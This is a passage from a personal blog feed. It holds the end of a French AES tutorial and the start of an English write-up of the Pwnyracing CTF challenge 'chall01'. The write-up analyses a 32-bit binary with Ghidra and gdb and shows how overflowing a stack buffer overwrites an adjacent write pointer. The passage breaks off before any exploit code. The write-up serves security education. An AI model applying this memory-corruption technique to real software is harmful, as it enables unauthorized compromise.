</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> ISubBytes(state)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, rounds):
</span></span><span style="display:flex;"><span>        round_key <span style="color:#f92672">=</span> key_state[len(key_state) <span style="color:#f92672">-</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) : len(key_state)<span style="color:#f92672">-</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i)]
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> IMixColumns(state)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> IShiftRows(state)
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> ISubBytes(state)
</span></span><span style="display:flex;"><span>    round_key <span style="color:#f92672">=</span> key_state[<span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> state
</span></span></code></pre></div>
</div>





</div>



<h2 id="conclusion">Conclusion<a href="#conclusion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>On a vu comment fonctionne en interne le chiffrement AES. Cependant ici on a chiffer et déchiffer qu&rsquo;un bloc de 16 octets. Dans la réalité, on aura des textes bien plus long, ce qui fait donc intervenir l&rsquo;utilisation de différents modes en AES (modes ECB, modes CBC, modes, CTR etc &hellip;).
Ceci pose donc les bases du chiffrement AES et nous permettra d&rsquo;avancer sur les différents types d&rsquo;attaques auxquels il est confronté.</p>
<p>Merci, et à très bientôt.</p>
<h4 id="références">Références<a href="#r%c3%a9f%c3%a9rences" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p><cite>Advanced Encryption Standard</cite> <a href="https://csrc.nist.gov/csrc/media/publications/fips/197/final/documents/fips-197.pdf">https://csrc.nist.gov/csrc/media/publications/fips/197/final/documents/fips-197.pdf</a><br>
<cite>Block breakers </cite> <a href="https://www.davidwong.fr/blockbreakers/aes.html">https://www.davidwong.fr/blockbreakers/aes.html</a><br>
<cite>coursAES</cite> <a href="https://www.di.ens.fr/~ferradi/coursAES.pdf">https://www.di.ens.fr/~ferradi/coursAES.pdf</a><br>
<cite>Cryptohack</cite> <a href="https://cryptohack.org/challenges/aes/">https://cryptohack.org/challenges/aes/</a><br>
<cite>Cryptanalyse de l&rsquo;AES à 5 tours</cite> <a href="https://perso.limos.fr/~axdurbet/media/Previous_work/projet_AES_5_tours.pdf">https://perso.limos.fr/~axdurbet/media/Previous_work/projet_AES_5_tours.pdf</a></p>
]]></content></item><item><title>Pwnyracing: Chall01</title><link>https://dilagluc.github.io/en/posts/2022/pwnyracing/pwnyracing/</link><pubDate>Sun, 11 Sep 2022 21:34:43 +0200</pubDate><author>dilag</author><guid>https://dilagluc.github.io/en/posts/2022/pwnyracing/pwnyracing/</guid><description>Uninitialised variable bug to write anywhere ain memory</description><content type="text/html" mode="escaped"><![CDATA[<p>Hello everyone,</p>
<p>I hope that you&rsquo;re well. Last time, I found on twitter an interesting set of challenges made by <a href="https://github.com/0xb0bb">0xb0bb</a>. After taking a look on it, I saw directly that I could learn new things with this, so I decided to do a writeup for some of them. You can find the challenges <a href="https://github.com/0xb0bb/ctf-challs/tree/main/pwnyracing">here</a>.
I&rsquo;m going to try the first one. Let&rsquo;s start.</p>
<h2 id="first-look">First look<a href="#first-look" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>We&rsquo;re going to do the things like a real ctf challenges, all we need is on <code>dist</code> directory. Let&rsquo;s take a look on it. We&rsquo;re given two files, an <code>stripped ELF 32</code> binary file and libc file. Let&rsquo;s check a security mecanism used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└──╼ $pwn checksec chall01
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     i386-32-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We can see that there is a partial relro, a canary and non executable stack(we supposed also that <code>PIE is enabled</code>).</p>
<p>Before start anything, we need to patch the binary to use a correct libc file (I made this mistake and found myself searching for days and days what&rsquo;s wrong). We will use <code>pwninit</code> for this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└──╼ $pwninit 
</span></span><span style="display:flex;"><span>bin: ./chall01
</span></span><span style="display:flex;"><span>libc: ./libc.so.6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fetching linker
</span></span><span style="display:flex;"><span>https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1_i386.deb
</span></span><span style="display:flex;"><span>unstripping libc
</span></span><span style="display:flex;"><span>https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_i386.deb
</span></span><span style="display:flex;"><span>warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory <span style="color:#f92672">(</span>os error 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>setting ./ld-2.27.so executable
</span></span><span style="display:flex;"><span>copying ./chall01 to ./chall01_patched
</span></span><span style="display:flex;"><span>running patchelf on ./chall01_patched
</span></span><span style="display:flex;"><span>writing solve.py stub
</span></span></code></pre></div><p>Now we have a patched binary file which use the right libc. Let run the binary and see what we have :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Welcome to rot13 as a service! - For all those hard <span style="color:#e6db74">&#34;sanity flag&#34;</span> CTF challenges
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>size: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>data: AAAAAAAAA
</span></span><span style="display:flex;"><span>resp: NNNNNNNNN
</span></span><span style="display:flex;"><span>more? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span>: y
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>size: <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>data: AAAAAAA
</span></span><span style="display:flex;"><span>resp: NNNNNNN
</span></span><span style="display:flex;"><span>more? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span>: n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bye .....
</span></span></code></pre></div><p>So we can see the binary asks for a size and data and performs a rot13 operation on this data. Let&rsquo;s reverse it and see what we can do.</p>
<h2 id="reversing">Reversing<a href="#reversing" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Looking at the decompiled code in Ghidra, we find quickly the function that handling the operation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> in_GS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_61;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> local_60;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>local_5c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_58 [<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_18;
</span></span><span style="display:flex;"><span>  undefined4 local_14;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_5c <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>  local_61 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;\0&#39;</span> <span style="color:#f92672">&lt;</span> local_61) {
</span></span><span style="display:flex;"><span>      iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>      local_61 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar2;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_61 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ungetc</span>((<span style="color:#66d9ef">int</span>)local_61,stdin);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">size: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d%*c&#34;</span>,<span style="color:#f92672">&amp;</span>local_60);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_60 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x49</span>) {
</span></span><span style="display:flex;"><span>      local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;data: &#34;</span>);
</span></span><span style="display:flex;"><span>    local_18 <span style="color:#f92672">=</span> local_58;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>      iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>      local_61 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar2;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (((local_61 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">||</span> (local_61 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)) <span style="color:#f92672">||</span> (local_61 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\r&#39;</span>)) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      pcVar1 <span style="color:#f92672">=</span> local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>local_18 <span style="color:#f92672">=</span> local_61;
</span></span><span style="display:flex;"><span>      local_18 <span style="color:#f92672">=</span> pcVar1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_61 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>      pcVar1 <span style="color:#f92672">=</span> local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>local_18 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>      local_18 <span style="color:#f92672">=</span> pcVar1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_5c <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(local_60);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_080488b4</span>(local_58,local_5c,local_60);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;resp: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,local_5c);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;more? (y/n): &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(local_58,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#f92672">&amp;</span>DAT_08050c5e,<span style="color:#f92672">&amp;</span>local_61);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> ((iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((local_61 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> (local_61 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span>))));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0804883e</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08048d40</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we can see it asks for a <code>size</code> and sets it to <code>0x48</code> if <code>size &lt; 0x49</code>. Size is saved into <code>local_60</code> variable. After that it asks for a data, sets <code>local_18</code> pointer to <code>local_58</code> buffer and starts reading data byte by byte into this buffer. So basically it uses <code>local_18</code> pointer to write into <code>local_58</code> buffer and since <code>local_18</code> pointer is right after the buffer we can write into that pointer, but we can just rewrite the LSB to point to another location.
Let&rsquo;s see it with gdb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048aee:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x80485a0</span> &lt;<span style="color:#66d9ef">printf@plt</span>&gt;  <span style="color:#75715e">//ask for data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048af3:	<span style="color:#a6e22e">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048af6:	<span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">eax</span>,[<span style="color:#66d9ef">ebp-0x54</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048af9:	<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0x14</span>],<span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048afc:	<span style="color:#a6e22e">jmp</span>    <span style="color:#ae81ff">0x8048b0d</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048afe:	<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0x14</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048b01:	<span style="color:#a6e22e">lea</span>    <span style="color:#66d9ef">edx</span>,[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048b04:	<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">DWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0x14</span>],<span style="color:#66d9ef">edx</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048b07:	<span style="color:#a6e22e">movzx</span>  <span style="color:#66d9ef">edx</span>,<span style="color:#66d9ef">BYTE</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">ebp-0x5d</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048b0b:	<span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">BYTE</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">eax</span>],<span style="color:#66d9ef">dl</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">0</span>x8048b0d:	<span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x80485c0</span> &lt;<span style="color:#66d9ef">getchar@plt</span>&gt;
</span></span></code></pre></div><p>We can see that after asking for data, it loads <code>ebp-0x54</code> address into <code>eax</code> and sets <code>ebp-0x14</code> address to <code>eax</code>, so we can conclude that buffer is at <code>ebp-0x54</code> and pointer at <code>ebp-0x14</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gef➤  p $ebp-0x54
</span></span><span style="display:flex;"><span>$6 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>void *<span style="color:#f92672">)</span> 0xffffd064
</span></span><span style="display:flex;"><span>gef➤  p $ebp-0x14
</span></span><span style="display:flex;"><span>$7 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>void *<span style="color:#f92672">)</span> 0xffffd0a4
</span></span><span style="display:flex;"><span>gef➤  x/30xw 0xffffd064
</span></span><span style="display:flex;"><span>0xffffd064:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd074:	0x41414141	0x41414141	0x41414141	0x41414141
</span></span><span style="display:flex;"><span>0xffffd084:	0x41414141	0xff004141	0x08048824	0x08050b9c
</span></span><span style="display:flex;"><span>0xffffd094:	0xf7feae20	0xf7e5a2bb	0x080487f2	0xf7fca000
</span></span><span style="display:flex;"><span>0xffffd0a4:	0xffffd08b	0x00000000	0xff953d00	0xf7fcad80
</span></span><span style="display:flex;"><span>0xffffd0b4:	0x08052000	0xffffd078	0x08048cad	0x00000000
</span></span><span style="display:flex;"><span>0xffffd0c4:	0x5e1b0751	0x60e6a141	0x00000000	0x00000000
</span></span><span style="display:flex;"><span>0xffffd0d4:	0x00000000	0x00000001
</span></span></code></pre></div><p>We can see that the value at <code>0xffffd0a4</code> address is the address where <code>0x41</code> end, this is our pointer. We&rsquo;re on the right way :)<br>
Another thing we can see in a decompiled code generated by Ghidra is our buffer is null byte terminate if only the input is <code>\n</code>. If our input is <code>\r</code>, we go to the malloc call without null terminated the buffer.</p>
<p>After asking for data, the program calls malloc with our size and calls <code>FUN_080488b4</code> with buffer, malloc result and size. Let&rsquo;s see <code>FUN_080488b4</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_080488b4</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar2;
</span></span><span style="display:flex;"><span>  ushort <span style="color:#f92672">**</span>ppuVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> in_GS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined auStack96 [<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>  undefined4 uStack80;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_48;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_44;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_40;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_34;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>local_30;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> local_2c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_28;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_24 [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  undefined4 local_14;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uStack80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80488c1</span>;
</span></span><span style="display:flex;"><span>  local_40 <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  local_44 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  local_48 <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>  local_24[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>  local_24[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_24[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>;
</span></span><span style="display:flex;"><span>  local_24[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> auStack96;
</span></span><span style="display:flex;"><span>  local_2c <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>);
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_44 <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    local_34 <span style="color:#f92672">=</span> local_44;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((<span style="color:#f92672">*</span>local_40 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (local_48 <span style="color:#f92672">=</span> local_48 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, local_48 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>))) {
</span></span><span style="display:flex;"><span>    ppuVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>ppuVar3)[<span style="color:#f92672">*</span>local_40] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>local_34 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>local_40;
</span></span><span style="display:flex;"><span>      local_40 <span style="color:#f92672">=</span> local_40 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      local_34 <span style="color:#f92672">=</span> local_34 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      ppuVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
</span></span><span style="display:flex;"><span>      pcVar2 <span style="color:#f92672">=</span> local_24[(<span style="color:#66d9ef">int</span>)(uint)(<span style="color:#f92672">*</span>ppuVar3)[<span style="color:#f92672">*</span>local_40] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>      cVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>local_40;
</span></span><span style="display:flex;"><span>      local_40 <span style="color:#f92672">=</span> local_40 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      iVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tolower</span>((<span style="color:#66d9ef">int</span>)cVar1);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>local_34 <span style="color:#f92672">=</span> pcVar2[(local_28 <span style="color:#f92672">+</span> iVar4 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x61</span>) <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int</span>)local_2c];
